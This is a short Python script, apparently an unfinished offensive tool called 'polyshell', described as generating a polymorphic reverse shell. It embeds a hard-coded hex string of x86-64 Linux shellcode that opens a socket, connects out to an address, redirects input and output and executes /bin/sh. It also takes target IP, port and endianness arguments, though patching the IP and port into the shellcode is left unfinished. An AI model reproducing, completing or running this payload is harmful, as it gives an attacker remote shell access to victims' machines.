#!/usr/bin/env python3
from email.mime import base
import sys
import argparse
from polyshell import dechex


def main():
    banner = '''
     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
    ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
    '''
    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6be901111124881ee11111111566668231d666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
    print(banner)
    parser = argparse.ArgumentParser(description='Tool to create polymorphique reverse shell')
    parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address')
    parser.add_argument('-p', '--port', dest='port', help='Port to bind')
    parser.add_argument('-e', '--endian', dest='endianness', choices=['big', 'little'], help='Endianness of the target', default='little')
    args = parser.parse_args()

    if len(sys.argv) < 7:
        parser.print_help()
        sys.exit(1)

    iphex = dechex.iphex(args.ip, args.endianness)
    if iphex:
        pass
    else:
        parser.print_help()
        sys.exit(1)
    
    #dechex.porthex(args.port, args.endianness)

if __name__ == '__main__':
    main()